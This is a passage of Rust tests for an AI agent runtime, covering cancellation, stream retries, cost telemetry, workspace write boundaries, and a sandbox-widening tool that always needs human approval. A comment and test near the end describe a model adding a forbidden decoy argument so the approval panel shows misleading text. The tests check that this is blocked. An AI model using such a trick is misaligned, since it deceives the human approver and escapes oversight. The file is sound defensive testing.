    assert_eq!(denied, ToolResultStatus::Denied);
    assert!(matches!(
        second.last(),
        Some(RuntimeEvent::ApprovalRequired { tool_call_id: Some(id), .. })
            if id.as_str() == "call_2"
    ));

    let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
    let third = drain(&mut rx).await;
    assert!(matches!(
        third.last(),
        Some(RuntimeEvent::TurnFinished { .. })
    ));

    let messages = runtime.session_messages().await;
    // user, assistant(2 tool_calls), tool(denied), tool(success), assistant("done")
    assert_eq!(messages.len(), 5);
    assert!(messages[2].content.contains("denied"));
    assert_eq!(messages[3].content, "mock_echo: second");
}

/// First call: yields one text delta then hangs forever; later calls stream
/// normally. Used to exercise mid-stream cancellation and token rotation.
struct HangThenRecoverClient {
    attempts: Arc<Mutex<u32>>,
}

impl HangThenRecoverClient {
    fn new() -> Self {
        Self {
            attempts: Arc::new(Mutex::new(0)),
        }
    }
}

#[async_trait::async_trait]
impl LlmClient for HangThenRecoverClient {
    fn provider_name(&self) -> &'static str {
        "hang-then-recover"
    }

    fn model(&self) -> &str {
        "hang-then-recover"
    }

    async fn stream_chat(&self, _request: ChatRequest) -> AgentResult<AgentEventStream> {
        let attempt = {
            let mut attempts = self.attempts.lock().unwrap();
            *attempts += 1;
            *attempts
        };
        let stream = try_stream! {
            if attempt == 1 {
                yield AgentEvent::TextDelta { text: "partial".to_string() };
                futures_util::future::pending::<()>().await;
            } else {
                yield AgentEvent::TextDelta { text: "recovered".to_string() };
                yield AgentEvent::Done { usage: None };
            }
        };
        let stream: Pin<Box<dyn Stream<Item = AgentResult<AgentEvent>> + Send>> = Box::pin(stream);
        Ok(stream)
    }
}

#[tokio::test]
async fn cancel_during_stream_keeps_partial_text_and_allows_next_turn() {
    let runtime = AgentRuntime::new(HangThenRecoverClient::new(), ToolRegistry::default());

    let mut rx = runtime.submit_user("hang please").await;
    while let Some(event) = rx.recv().await {
        if matches!(event, RuntimeEvent::AssistantDelta { .. }) {
            break;
        }
    }

    let _ = runtime.cancel_turn().await;

    let mut saw_cancelled = false;
    while let Some(event) = rx.recv().await {
        if matches!(event, RuntimeEvent::TurnCancelled { .. }) {
            saw_cancelled = true;
        }
    }
    assert!(saw_cancelled, "expected TurnCancelled on the live channel");

    let messages = runtime.session_messages().await;
    assert_eq!(messages.len(), 2);
    assert_eq!(messages[1].content, "partial");
    assert!(messages[1].tool_calls.is_empty());

    // Token was rotated: a fresh turn streams to completion.
    let mut rx = runtime.submit_user("again").await;
    let events = drain(&mut rx).await;
    assert!(matches!(
        events.last(),
        Some(RuntimeEvent::TurnFinished { .. })
    ));
    assert_eq!(
        runtime.session_messages().await.last().unwrap().content,
        "recovered"
    );
}

#[tokio::test]
async fn cancel_while_waiting_approval_synthesizes_results_for_batch() {
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::ToolCallDelta {
            delta: indexed_tool_call_delta(0, "call_1", MockEchoTool::NAME, r#"{"message":"a"}"#),
        },
        AgentEvent::ToolCallDelta {
            delta: indexed_tool_call_delta(1, "call_2", MockEchoTool::NAME, r#"{"message":"b"}"#),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let runtime = AgentRuntime::new(client, ToolRegistry::with_mock_tools());

    let mut rx = runtime.submit_user("run both").await;
    let first = drain(&mut rx).await;
    assert!(matches!(
        first.last(),
        Some(RuntimeEvent::ApprovalRequired { .. })
    ));

    let mut rx = runtime.cancel_turn().await;
    let events = drain(&mut rx).await;

    assert_eq!(finished_ids(&events), vec!["call_1", "call_2"]);
    assert!(events.iter().all(|event| match event {
        RuntimeEvent::ToolCallFinished { result, .. } => {
            result.status == ToolResultStatus::Error && result.content.contains("取消")
        }
        _ => true,
    }));
    assert!(matches!(
        events.last(),
        Some(RuntimeEvent::TurnCancelled { .. })
    ));

    // Every tool_call keeps a paired tool message: no dangling calls.
    let messages = runtime.session_messages().await;
    assert_eq!(messages.len(), 4);
    assert_eq!(messages[1].tool_calls.len(), 2);
    assert_eq!(messages[2].tool_call_id.as_deref(), Some("call_1"));
    assert_eq!(messages[3].tool_call_id.as_deref(), Some("call_2"));
}

/// Per-attempt scripted behaviors for stream-robustness tests. Each
/// `stream_chat` call consumes the next behavior and records the model used.
#[derive(Debug, Clone)]
enum AttemptBehavior {
    /// `stream_chat` itself fails with this API status.
    ConnectFail(u16),
    /// Stream errors immediately, before any content.
    StreamErr,
    /// Stream yields text, then errors.
    TextThenErr(String),
    /// Stream yields nothing and pends forever.
    Hang,
    /// Stream yields this text and finishes cleanly.
    Text(String),
}

#[derive(Clone)]
struct AttemptScriptClient {
    inner: Arc<AttemptScriptInner>,
}

struct AttemptScriptInner {
    behaviors: Mutex<Vec<AttemptBehavior>>,
    models: Mutex<Vec<String>>,
}

impl AttemptScriptClient {
    fn new(behaviors: Vec<AttemptBehavior>) -> Self {
        Self {
            inner: Arc::new(AttemptScriptInner {
                behaviors: Mutex::new(behaviors),
                models: Mutex::new(Vec::new()),
            }),
        }
    }

    fn models_used(&self) -> Vec<String> {
        self.inner.models.lock().unwrap().clone()
    }

    fn attempts(&self) -> usize {
        self.inner.models.lock().unwrap().len()
    }
}

#[async_trait::async_trait]
impl LlmClient for AttemptScriptClient {
    fn provider_name(&self) -> &'static str {
        "attempt-script"
    }

    fn model(&self) -> &str {
        "attempt-script"
    }

    async fn stream_chat(&self, request: ChatRequest) -> AgentResult<AgentEventStream> {
        self.inner
            .models
            .lock()
            .unwrap()
            .push(request.model.clone());
        let behavior = {
            let mut behaviors = self.inner.behaviors.lock().unwrap();
            if behaviors.is_empty() {
                AttemptBehavior::Text("default".to_string())
            } else {
                behaviors.remove(0)
            }
        };
        if let AttemptBehavior::ConnectFail(status) = behavior {
            return Err(AgentError::Api {
                status: reqwest::StatusCode::from_u16(status).unwrap(),
                message: "scripted failure".to_string(),
            });
        }
        let stream = try_stream! {
            match behavior {
                AttemptBehavior::ConnectFail(_) => unreachable!("handled above"),
                AttemptBehavior::StreamErr => {
                    Err(AgentError::Parse("connection reset".to_string()))?;
                }
                AttemptBehavior::TextThenErr(text) => {
                    yield AgentEvent::TextDelta { text };
                    Err(AgentError::Parse("broken mid-stream".to_string()))?;
                }
                AttemptBehavior::Hang => {
                    futures_util::future::pending::<()>().await;
                }
                AttemptBehavior::Text(text) => {
                    yield AgentEvent::TextDelta { text };
                    yield AgentEvent::Done { usage: None };
                }
            }
        };
        let stream: Pin<Box<dyn Stream<Item = AgentResult<AgentEvent>> + Send>> = Box::pin(stream);
        Ok(stream)
    }
}

fn turn_finished_telemetry(events: &[RuntimeEvent]) -> Option<super::telemetry::TurnTelemetry> {
    events.iter().find_map(|event| match event {
        RuntimeEvent::TurnFinished { telemetry, .. } => telemetry.clone(),
        _ => None,
    })
}

#[tokio::test(start_paused = true)]
async fn stream_error_before_content_retries_transparently() {
    let client = AttemptScriptClient::new(vec![
        AttemptBehavior::StreamErr,
        AttemptBehavior::Text("recovered".to_string()),
    ]);
    let runtime = AgentRuntime::new(client.clone(), ToolRegistry::default());

    let mut rx = runtime.submit_user("hi").await;
    let events = drain(&mut rx).await;

    assert!(
        events
            .iter()
            .all(|event| !matches!(event, RuntimeEvent::Error { .. })),
        "transparent retry must not surface an error"
    );
    assert!(matches!(
        events.last(),
        Some(RuntimeEvent::TurnFinished { .. })
    ));
    assert_eq!(client.attempts(), 2);
    let telemetry = turn_finished_telemetry(&events).expect("telemetry");
    assert_eq!(telemetry.stream_retries, 1);
    assert_eq!(
        runtime.session_messages().await.last().unwrap().content,
        "recovered"
    );
}

#[tokio::test(start_paused = true)]
async fn stream_error_after_content_is_not_retried() {
    let client = AttemptScriptClient::new(vec![AttemptBehavior::TextThenErr("part".to_string())]);
    let runtime = AgentRuntime::new(client.clone(), ToolRegistry::default());

    let mut rx = runtime.submit_user("hi").await;
    let events = drain(&mut rx).await;

    assert_eq!(client.attempts(), 1, "billed content must never be retried");
    assert!(
        events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::Error { .. }))
    );
}

#[tokio::test(start_paused = true)]
async fn stalled_stream_times_out_with_chinese_error() {
    let client = AttemptScriptClient::new(vec![AttemptBehavior::Hang]);
    let config = AgentConfig {
        stream_chunk_timeout: std::time::Duration::from_secs(5),
        language: "zh".to_string(),
        ..AgentConfig::builtin()
    };
    let runtime =
        AgentRuntime::with_system_prompt(client, ToolRegistry::default(), "system", config, false);

    let mut rx = runtime.submit_user("hi").await;
    let events = drain(&mut rx).await;

    assert!(events.iter().any(|event| matches!(
        event,
        RuntimeEvent::Error { message, .. } if message.contains("卡顿")
    )));
}

#[tokio::test(start_paused = true)]
async fn oversized_stream_is_cut_off() {
    let client = AttemptScriptClient::new(vec![AttemptBehavior::Text("x".repeat(64))]);
    let config = AgentConfig {
        stream_max_bytes: 10,
        language: "zh".to_string(),
        ..AgentConfig::builtin()
    };
    let runtime =
        AgentRuntime::with_system_prompt(client, ToolRegistry::default(), "system", config, false);

    let mut rx = runtime.submit_user("hi").await;
    let events = drain(&mut rx).await;

    assert!(events.iter().any(|event| matches!(
        event,
        RuntimeEvent::Error { message, .. } if message.contains("过大")
    )));
}

#[tokio::test]
async fn cancel_during_open_backoff_finalizes_as_cancelled() {
    let client = AttemptScriptClient::new(vec![
        AttemptBehavior::ConnectFail(503),
        AttemptBehavior::ConnectFail(503),
        AttemptBehavior::ConnectFail(503),
        AttemptBehavior::ConnectFail(503),
    ]);
    let runtime = AgentRuntime::new(client.clone(), ToolRegistry::default());

    let mut rx = runtime.submit_user("hi").await;
    // Give the loop time to fail the first attempt and enter backoff sleep.
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;
    let _ = runtime.cancel_turn().await;
    let events = drain(&mut rx).await;

    assert!(matches!(
        events.last(),
        Some(RuntimeEvent::TurnCancelled { .. })
    ));
    assert!(
        events
            .iter()
            .all(|event| !matches!(event, RuntimeEvent::Error { .. }))
    );
    assert!(client.attempts() <= 2, "cancel must abort the backoff");
}

#[tokio::test(start_paused = true)]
async fn open_retry_runs_after_fallback_exhausted_and_is_counted() {
    use crate::model_registry::{AUTO_MODEL, DEEPSEEK_FLASH, DEEPSEEK_V4_PRO};

    let client = AttemptScriptClient::new(vec![
        AttemptBehavior::ConnectFail(503),
        AttemptBehavior::ConnectFail(503),
        AttemptBehavior::Text("recovered".to_string()),
    ]);
    let config = AgentConfig {
        model: AUTO_MODEL.to_string(),
        ..AgentConfig::builtin()
    };
    let runtime = AgentRuntime::with_system_prompt(
        client.clone(),
        ToolRegistry::default(),
        "system",
        config,
        false,
    );

    let mut rx = runtime.submit_user("debug this crash").await;
    let events = drain(&mut rx).await;

    // Pinned order: Pro fails -> immediate Flash fallback fails -> backoff
    // retry stays on the downgraded Flash model and succeeds.
    assert_eq!(
        client.models_used(),
        vec![
            DEEPSEEK_V4_PRO.to_string(),
            DEEPSEEK_FLASH.to_string(),
            DEEPSEEK_FLASH.to_string()
        ]
    );
    let telemetry = turn_finished_telemetry(&events).expect("telemetry");
    assert_eq!(telemetry.stream_retries, 1);
    assert!(telemetry.used_model_fallback);
    assert_eq!(
        runtime.session_messages().await.last().unwrap().content,
        "recovered"
    );
}

#[tokio::test]
async fn stream_error_keeps_partial_assistant_text() {
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::TextDelta {
            text: "partial answer".to_string(),
        },
        AgentEvent::Error {
            message: "boom".to_string(),
        },
    ]]);
    let runtime = AgentRuntime::new(client, ToolRegistry::default());

    let mut rx = runtime.submit_user("hi").await;
    let events = drain(&mut rx).await;

    assert!(
        events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::Error { .. }))
    );
    let messages = runtime.session_messages().await;
    // Same semantics as cancellation: the streamed partial text survives.
    assert_eq!(messages.len(), 2);
    assert_eq!(messages[1].content, "partial answer");
    assert!(messages[1].tool_calls.is_empty());
}

#[tokio::test]
async fn cancel_turn_when_idle_is_silent_noop() {
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::TextDelta {
            text: "hello".to_string(),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let runtime = AgentRuntime::new(client, ToolRegistry::default());

    let mut rx = runtime.cancel_turn().await;
    let events = drain(&mut rx).await;
    assert!(events.is_empty(), "idle cancel must not emit events");

    let mut rx = runtime.submit_user("hi").await;
    let events = drain(&mut rx).await;
    assert!(matches!(
        events.last(),
        Some(RuntimeEvent::TurnFinished { .. })
    ));
}

#[tokio::test]
async fn repeated_tool_errors_trigger_cascade_and_surface_in_telemetry() {
    // The model calls a failing tool twice in one turn; both error, crossing
    // the cascade threshold. The triggering turn still finishes on Flash, but
    // its telemetry must flag `cascade_triggered` so the escalation is visible.
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: indexed_tool_call_delta(0, "c1", FailingTool::NAME, "{}"),
            },
            AgentEvent::ToolCallDelta {
                delta: indexed_tool_call_delta(1, "c2", FailingTool::NAME, "{}"),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let config = AgentConfig {
        model: crate::model_registry::AUTO_MODEL.to_string(),
        approval_auto_allow: vec![FailingTool::NAME.to_string()],
        ..AgentConfig::builtin()
    };
    let mut registry = ToolRegistry::with_mock_tools();
    registry.register(FailingTool);
    let runtime = AgentRuntime::with_config(client, registry, config);

    let mut rx = runtime.submit_user("do the thing").await;
    let events = drain(&mut rx).await;
    let telemetry = events
        .iter()
        .rev()
        .find_map(|event| match event {
            RuntimeEvent::TurnFinished { telemetry, .. } => telemetry.clone(),
            _ => None,
        })
        .expect("turn should finish with telemetry");
    assert!(
        telemetry.cascade_triggered,
        "two tool-call failures in one turn must trigger cascade escalation"
    );
}

/// One scripted `write_file` delta targeting `path`, at batch `index`.
fn outside_write_delta(index: u32, path: &std::path::Path) -> AgentEvent {
    AgentEvent::ToolCallDelta {
        delta: indexed_tool_call_delta(
            index,
            &format!("c{index}"),
            "write_file",
            &serde_json::json!({"path": path.to_string_lossy(), "content": "x"}).to_string(),
        ),
    }
}

#[tokio::test]
async fn boundary_denials_trip_the_breaker_with_add_dir_guidance() {
    // Three write_file calls to an absolute path outside every granted root —
    // three boundary denials in one batch. The breaker must end the turn with
    // guidance naming /add-dir and the denied path, instead of feeding the
    // errors back for a fourth attempt; the scripted second response must
    // never be requested.
    let workspace = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    // Canonical spelling: the raw tempdir path goes through a symlink on
    // macOS (`/var` → `/private/var`), which trips the symlink ban before
    // containment — a different rejection class than the one under test.
    let target = outside.path().canonicalize().unwrap().join("f.txt");
    let client = ScriptedClient::new(vec![
        vec![
            outside_write_delta(0, &target),
            outside_write_delta(1, &target),
            outside_write_delta(2, &target),
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "unreachable".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let config = AgentConfig {
        approval_auto_allow: vec!["write_file".to_string()],
        ..AgentConfig::builtin()
    };
    let registry =
        crate::workspace_tools::workspace_tool_registry(workspace.path().to_path_buf()).unwrap();
    let runtime = AgentRuntime::with_config(client, registry, config);

    let mut rx = runtime.submit_user("edit the sibling repo").await;
    let events = drain(&mut rx).await;

    let message = events
        .iter()
        .find_map(|event| match event {
            RuntimeEvent::Error { message, .. } => Some(message.clone()),
            _ => None,
        })
        .expect("the breaker must surface a user-facing error event");
    assert!(
        message.contains("/add-dir"),
        "breaker guidance must name the remedy: {message}"
    );
    assert!(
        message.contains(target.to_string_lossy().as_ref()),
        "breaker guidance should name the denied path: {message}"
    );
    assert!(
        !events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::TurnFinished { .. })),
        "the turn must abort at the breaker, not finish into another model round"
    );
}

#[tokio::test]
async fn boundary_denials_do_not_latch_cascade_escalation() {
    // Two boundary denials — exactly the count that latches the cascade when
    // the failures are ordinary — then a clean finish. Telemetry must NOT
    // flag an escalation: a stronger model cannot move the granted-roots
    // fence, so paying Pro prices for these retries is pure waste.
    let workspace = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    // Canonical for the same reason as the breaker test above.
    let target = outside.path().canonicalize().unwrap().join("f.txt");
    let client = ScriptedClient::new(vec![
        vec![
            outside_write_delta(0, &target),
            outside_write_delta(1, &target),
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "understood, asking the user".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let config = AgentConfig {
        model: crate::model_registry::AUTO_MODEL.to_string(),
        approval_auto_allow: vec!["write_file".to_string()],
        ..AgentConfig::builtin()
    };
    let registry =
        crate::workspace_tools::workspace_tool_registry(workspace.path().to_path_buf()).unwrap();
    let runtime = AgentRuntime::with_config(client, registry, config);

    let mut rx = runtime.submit_user("edit the sibling repo").await;
    let events = drain(&mut rx).await;
    let telemetry = events
        .iter()
        .rev()
        .find_map(|event| match event {
            RuntimeEvent::TurnFinished { telemetry, .. } => telemetry.clone(),
            _ => None,
        })
        .expect("two denials stay under the breaker; the turn finishes normally");
    assert!(
        !telemetry.cascade_triggered,
        "boundary denials must not latch the Pro escalation"
    );
}

/// A new `begin_turn` while a previous turn is still live (HTTP client
/// disconnected mid-turn, new prompt arrived) must cancel the old loop, and
/// the old loop's late finalization must not consume the new turn's state.
#[tokio::test]
async fn begin_turn_supersedes_live_turn_without_clobbering() {
    let client = ScriptedClient::new(vec![]);
    let runtime = AgentRuntime::new(client, ToolRegistry::default());

    runtime.begin_turn("first").await;
    let (first_id, first_token) = {
        let state = runtime.state.lock().await;
        (
            state.current_turn_id.clone().expect("first turn live"),
            state.cancel.clone(),
        )
    };

    runtime.begin_turn("second").await;
    assert!(
        first_token.is_cancelled(),
        "superseding begin_turn must cancel the previous turn's loop"
    );

    // The superseded loop finalizing late must be a no-op under the id guard.
    runtime.finish_turn(&first_id).await;
    let state = runtime.state.lock().await;
    assert!(
        state.current_turn.is_some(),
        "stale finalization must not consume the new turn's record"
    );
    assert_eq!(
        state
            .current_prompt
            .as_ref()
            .map(|prompt| prompt.text.as_str()),
        Some("second")
    );
    assert!(state.current_turn_id.is_some());
}

/// The SSE lease drop cancels via `cancel_turn_if(its_turn)`. A stale lease
/// from a finished/superseded turn must NOT cancel the successor turn that a
/// new request already began on the shared runtime — only a matching id fires.
#[tokio::test]
async fn cancel_turn_if_only_cancels_the_named_turn() {
    let client = ScriptedClient::new(vec![]);
    let runtime = AgentRuntime::new(client, ToolRegistry::default());

    runtime.begin_turn("first").await;
    let first_id = runtime.live_turn_id().await.expect("first turn live");

    // A successor turn supersedes it (fresh cancel token).
    runtime.begin_turn("second").await;
    let (second_id, second_token) = {
        let state = runtime.state.lock().await;
        (
            state.current_turn_id.clone().expect("second turn live"),
            state.cancel.clone(),
        )
    };

    // Stale lease for the first turn fires late — must be a no-op.
    drop(runtime.cancel_turn_if(first_id).await);
    assert!(
        !second_token.is_cancelled(),
        "a stale turn's lease must not cancel the successor"
    );
    assert_eq!(
        runtime
            .state
            .lock()
            .await
            .current_prompt
            .as_ref()
            .map(|prompt| prompt.text.as_str()),
        Some("second"),
        "the successor turn stays live"
    );

    // The lease that actually owns the live turn still cancels it.
    drop(runtime.cancel_turn_if(second_id).await);
    assert!(
        second_token.is_cancelled(),
        "cancel_turn_if must cancel the turn it names"
    );
}

/// Shutdown must cancel a live turn and wait for its loop to finalize: the
/// tool-side cancel arms (the foreground shell's process-group kill, a
/// sub-agent's own turn cancel) only run while the loop is still polled.
/// Skipping this leaves them to `kill_on_drop` at process exit, which signals
/// the group leader alone — grandchildren survive and keep their ports.
#[tokio::test]
async fn shutdown_cancels_live_turn_and_waits_for_finalize() {
    let started = Arc::new(tokio::sync::Notify::new());
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::ToolCallDelta {
            delta: tool_call_delta("call_1", ParkUntilCancelledTool::NAME, "{}"),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let mut registry = ToolRegistry::default();
    registry.register(ParkUntilCancelledTool {
        started: Arc::clone(&started),
    });
    let runtime = AgentRuntime::new(client, registry);

    let _rx = runtime.submit_user("go").await;
    // Only proceed once the call is parked on the token; shutting down before
    // the tool starts would exercise nothing.
    started.notified().await;

    runtime.shutdown().await;

    assert!(
        runtime.live_turn_id().await.is_none(),
        "shutdown must cancel the live turn and see it finalized"
    );
}

/// Spend a tool reports out-of-band (the sub-agent shape) must fold into the
/// parent session's lifetime totals — cost AND cache counters, the same
/// accounting `record_classifier_cost` uses — even though the turn's own
/// telemetry never saw those requests.
#[tokio::test]
async fn tool_reported_spend_folds_into_session_totals() {
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_1", SpendReportingTool::NAME, "{}"),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let mut registry = ToolRegistry::default();
    registry.register(SpendReportingTool);
    let runtime = AgentRuntime::new(client, registry);

    let mut rx = runtime.submit_user("go").await;
    let events = drain(&mut rx).await;
    assert!(matches!(
        events.last(),
        Some(RuntimeEvent::TurnFinished { .. })
    ));

    let state = runtime.state.lock().await;
    assert!(
        (state.session_cost.usd - 0.5).abs() < 1e-9 && (state.session_cost.cny - 3.5).abs() < 1e-9,
        "reported cost must land in session_cost"
    );
    assert_eq!(state.session_cache_hit_tokens, 300);
    assert_eq!(state.session_cache_miss_tokens, 100);
    assert!(
        (state.session_cache_savings.usd - 0.2).abs() < 1e-9,
        "reported cache savings must land in session_cache_savings"
    );
}

/// A turn that spans multiple requests (tool call → follow-up) must price
/// every request, not just the final one. Context-shaped fields
/// (prompt_tokens) keep final-request semantics; cache totals cover the
/// whole turn.
#[tokio::test]
async fn multi_request_turn_accumulates_cost_across_requests() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};
    use crate::model::Usage;
    use crate::pricing::calculate_turn_cost;

    let usage_first = Usage {
        prompt_tokens: Some(1_000),
        completion_tokens: Some(200),
        total_tokens: Some(1_200),
        reasoning_tokens: None,
        prompt_cache_hit_tokens: Some(600),
        prompt_cache_miss_tokens: Some(400),
    };
    let usage_second = Usage {
        prompt_tokens: Some(1_500),
        completion_tokens: Some(50),
        total_tokens: Some(1_550),
        reasoning_tokens: None,
        prompt_cache_hit_tokens: Some(1_400),
        prompt_cache_miss_tokens: Some(100),
    };
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"hi"}"#),
            },
            AgentEvent::Done {
                usage: Some(usage_first.clone()),
            },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done {
                usage: Some(usage_second.clone()),
            },
        ],
    ]);
    let runtime = AgentRuntime::new(client, ToolRegistry::with_mock_tools())
        .with_permission_mode(SharedPermissionMode::new(PermissionMode::Yolo));

    let mut rx = runtime.submit_user("please echo").await;
    let events = drain(&mut rx).await;
    let telemetry = events
        .iter()
        .find_map(|event| match event {
            RuntimeEvent::TurnFinished { telemetry, .. } => telemetry.as_ref(),
            _ => None,
        })
        .expect("turn finished with telemetry");

    let expected = {
        let first = calculate_turn_cost(&telemetry.effective_model, &usage_first);
        let second = calculate_turn_cost(&telemetry.effective_model, &usage_second);
        (first.usd + second.usd, first.cny + second.cny)
    };
    assert!(
        (telemetry.turn_cost.usd - expected.0).abs() < 1e-9
            && (telemetry.turn_cost.cny - expected.1).abs() < 1e-9,
        "turn cost must sum every request: got {:?}, want {expected:?}",
        telemetry.turn_cost
    );
    // Final-request semantics for the context-shaped fields.
    assert_eq!(telemetry.prompt_tokens, 1_500);
    assert_eq!(telemetry.completion_tokens, 50);
    // Whole-turn cache totals.
    assert_eq!(telemetry.cache_hit_tokens, Some(2_000));
    assert_eq!(telemetry.cache_miss_tokens, Some(500));
    // First turn of the session: session totals equal the turn's.
    assert!((telemetry.session_cost.usd - telemetry.turn_cost.usd).abs() < f64::EPSILON);
    assert_eq!(telemetry.session_cache_hit_tokens, 2_000);
    assert_eq!(telemetry.session_cache_miss_tokens, 500);
}

// ---------------------------------------------------------------------------
// request_write_root: the model-side doorbell for widening the write boundary
// ---------------------------------------------------------------------------

/// Registry + shared boundary for the root-grant tests: workspace tools and
/// the request tool built on ONE policy, exactly like a real launch.
fn root_grant_fixture(
    workspace: &std::path::Path,
) -> (ToolRegistry, crate::workspace_policy::WorkspacePolicy) {
    let policy = crate::workspace_policy::WorkspacePolicy::new(workspace.to_path_buf()).unwrap();
    let mut registry = crate::workspace_tools::workspace_tool_registry_from(policy.clone());
    registry.register(crate::root_grant::RequestWriteRootTool);
    (registry, policy)
}

fn request_root_script(target: &std::path::Path) -> Vec<AgentEvent> {
    vec![
        AgentEvent::ToolCallDelta {
            delta: tool_call_delta(
                "call_grant",
                "request_write_root",
                &serde_json::json!({
                    "path": target.to_string_lossy(),
                    "justification": "the build writes its artifacts there",
                })
                .to_string(),
            ),
        },
        AgentEvent::Done { usage: None },
    ]
}

/// The tool declares `deny_unknown_fields`, but the runtime intercepts it
/// before `Tool::run`, so nothing used to enforce that. It is not cosmetic: the
/// approval panel picks its action line by scanning arguments for the first
/// familiar key, and `command` outranks `path` — an extra key the schema
/// forbids could show the human text of the model's choosing while the grant
/// landed on `path`. The argument set is now validated before anyone is
/// prompted.
#[tokio::test]
async fn root_grant_with_unknown_arguments_bounces_without_prompting() {
    let workspace = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    let (registry, policy) = root_grant_fixture(workspace.path());
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta(
                    "call_grant",
                    "request_write_root",
                    &serde_json::json!({
                        "path": outside.path().to_string_lossy(),
                        "justification": "the build writes its artifacts there",
                        // The decoy: forbidden by the schema, and the key the
                        // panel would rank ahead of `path`.
                        "command": "cat CHANGELOG.md",
                    })
                    .to_string(),
                ),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "ok".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::new(client, registry).with_boundary(Some(policy.clone()));

    let mut rx = runtime.submit_user("write there").await;
    let events = drain(&mut rx).await;
    assert!(
        !events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::ApprovalRequired { .. })),
        "an argument set the schema forbids must never reach the human: {events:?}"
    );
    assert!(
        events.iter().any(|event| matches!(
            event,
            RuntimeEvent::ToolCallFinished { result, .. }
                if result.tool_name == "request_write_root"
                    && result.status == ToolResultStatus::Error
                    && result.content.contains("invalid request_write_root arguments")
        )),
        "the model gets the precise reason: {events:?}"
    );
    assert_eq!(policy.granted_roots().len(), 1, "nothing granted");
}

/// Yolo auto-approves everything EXCEPT a root grant: widening the sandbox is
/// the one decision Yolo's containment story cannot delegate to itself.
#[tokio::test]
async fn yolo_mode_still_parks_a_root_grant() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};
    let workspace = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    let (registry, policy) = root_grant_fixture(workspace.path());
    let client = ScriptedClient::new(vec![request_root_script(outside.path())]);
    let runtime = AgentRuntime::new(client, registry)
        .with_boundary(Some(policy))
        .with_permission_mode(SharedPermissionMode::new(PermissionMode::Yolo));

    let mut rx = runtime.submit_user("build it").await;
    let events = drain(&mut rx).await;
    assert!(
        matches!(events.last(), Some(RuntimeEvent::ApprovalRequired { .. })),
        "a root grant must park even under Yolo: {events:?}"
    );
}

/// Neither standing consent channel may cover a root grant: not a config
/// `auto_allow` entry (exact tool name — this test spells it out in full),
/// not a recorded session approval.
#[tokio::test]
async fn standing_consents_never_cover_a_root_grant() {
    let workspace = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    let (registry, policy) = root_grant_fixture(workspace.path());
    let client = ScriptedClient::new(vec![request_root_script(outside.path())]);
    let config = crate::config::AgentConfig {
        approval_auto_allow: vec!["request_write_root".to_string()],
        ..crate::config::AgentConfig::builtin()
    };
    let runtime = AgentRuntime::with_config(client, registry, config).with_boundary(Some(policy));
    runtime
        .state
        .lock()
        .await
        .session_approved
        .insert("request_write_root".to_string());

    let mut rx = runtime.submit_user("build it").await;
    let events = drain(&mut rx).await;
    assert!(
        matches!(events.last(), Some(RuntimeEvent::ApprovalRequired { .. })),
        "config auto_allow and session memory must not skip the human: {events:?}"
    );
}

/// The full approved path: the request parks (even under AcceptEdits), the
/// human approves, the boundary widens LIVE (a write_file into the new root
/// succeeds in the same session without any relaunch), the UI event fires,
/// and the request carried the model's justification to the prompt.
#[tokio::test]
async fn approved_root_grant_widens_the_boundary_live() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};
    let workspace = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    let target = outside.path().canonicalize().unwrap();
    let (registry, policy) = root_grant_fixture(workspace.path());

    let file_in_new_root = target.join("artifact.txt");
    let client = ScriptedClient::new(vec![
        request_root_script(&target),
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta(
                    "call_write",
                    "write_file",
                    &serde_json::json!({
                        "path": file_in_new_root.to_string_lossy(),
                        "content": "built",
                    })
                    .to_string(),
                ),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    // AcceptEdits: write_file auto-approves, the root grant must NOT.
    let runtime = AgentRuntime::new(client, registry)
        .with_boundary(Some(policy.clone()))
